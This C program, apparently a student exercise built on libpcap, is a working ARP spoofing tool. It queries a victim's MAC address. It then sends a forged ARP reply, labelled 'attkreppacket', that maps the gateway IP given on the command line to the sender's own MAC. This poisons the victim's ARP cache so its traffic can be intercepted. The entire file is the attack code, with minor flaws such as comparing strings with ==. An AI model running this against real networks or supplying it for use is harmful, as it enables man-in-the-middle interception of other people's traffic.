#include <stdio.h>
#include <stdint.h>
#include <string.h> /* for strncpy */
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "arp.h"


void GetMyAddr(char *dev,unsigned char *hostmac ,char *hostip, const char *hw){
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev , IFNAMSIZ -1);
    if( hw == "mac"){
        ioctl(fd, SIOCGIFHWADDR, &ifr);
        close(fd);
        for(int i=0;i<6;i++)
            *(hostmac+i) = (u_char)ifr.ifr_hwaddr.sa_data[i];      //change structrue
    }
    if( hw == "ip"){       //ip
        ioctl(fd,SIOCGIFADDR, &ifr);
        close(fd);
        sprintf(hostip, "%s",inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    }
}

void usage() {
    printf("syntax: pcap_test <interface> <sender IP> <target IP>\n");
    printf("sample: pcap_test wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    int i;
    unsigned char hostmac[6];
    char hostip[20] = {0, };
    GetMyAddr(dev, hostmac,hostip, "mac");                         //00:0c:29:bb:69:37
    GetMyAddr(dev, hostmac,hostip, "ip");                           //192.168.-

    unsigned char pkt[sizeof(struct Ethernet_header)+sizeof(struct ARP_header)]={0};
    struct Ethernet_header *eh = (struct Ethernet_header *)pkt;
    struct ARP_header *arph = (struct ARP_header *)(pkt + sizeof(struct Ethernet_header));
    for(i=0;i<6;i++) eh->dmac[i] = 0xff;                    //ff:ff:ff:ff:ff:ff
    for(i=0;i<6;i++) eh->smac[i] = hostmac[i];              //00:0c:29:bb:69:37
    eh->type = ntohs(0x0806);                               //ARP
    arph->htype = ntohs(0x0001);                            //Ethernet (1)
    arph->ptype = ntohs(0x0800);                            //IPv4 (0x0800)
    arph->hsize = 0x06;                                     //6
    arph->psize = 0x04;                                     //4
    arph->opcode =ntohs(REQUEST);                           //request (1)
    for(i=0;i<6;i++) arph->smac_addr[i] = hostmac[i];       //SMAC : 00:0c:29:bb:69:37
    arph->sip_addr =inet_addr(hostip);                      //SIP : hostip
    for(i=0;i<6;i++) arph->tmac_addr[i] = 0x00;             //TMAC : 00:00:00:00:00:00
    arph->tip_addr=inet_addr(argv[2]);                      //TIP : sendIP(argv[2])
    printf("------------------sendreqpacket-----------------\n");
    for(i=0; i<42;i++) printf("%02x ",pkt[i]);

    int res = pcap_sendpacket(handle, pkt,sizeof(pkt));
    if(res == 0) printf("\nsuccess!\n");
    else {
        printf("\nerror!\n");
        return -1;
    }
    while(1){
        struct pcap_pkthdr* header;
        const u_char* replypkt;
        res = pcap_next_ex(handle, &header, &replypkt);
        if (res == 0) continue;
        if (res == -1 || res == -2)break;
        struct Ethernet_header *eh1 = (struct Ethernet_header *)replypkt;
        struct ARP_header *arph1 = (struct ARP_header *)(replypkt + sizeof(struct Ethernet_header));
        printf("finding...\n");

        if( (eh1->type == eh->type) && (ntohs(arph1->opcode) == REPLY) && (arph->tip_addr == arph1->sip_addr) && (arph->sip_addr == arph1->tip_addr)){
            printf("------------------nextreppacket-----------------\n");
            for(i=0; i<42;i++) printf("%02x ",replypkt[i]);
            for(i=0;i<6;i++) eh->dmac[i] = eh1->smac[i];                   //sendMAC
            arph->opcode = ntohs(REPLY);                                   //REPLY (1)
            arph->sip_addr=inet_addr(argv[3]);                             //gateway IP
            for(i=0;i<6;i++) arph->tmac_addr[i] = eh->dmac[i];             //sendMAC
            printf("\n------------------attkreppacket-----------------\n");
            for(i=0; i<42;i++) printf("%02x ",pkt[i]);
            break;
        }
    }

    res= pcap_sendpacket(handle,pkt,sizeof(pkt));
        if(res == 0) printf("\nsuccess!\n");
        else {
            printf("\nerror!\n");
            return -1;
        }



    pcap_close(handle);
    return 0;
}
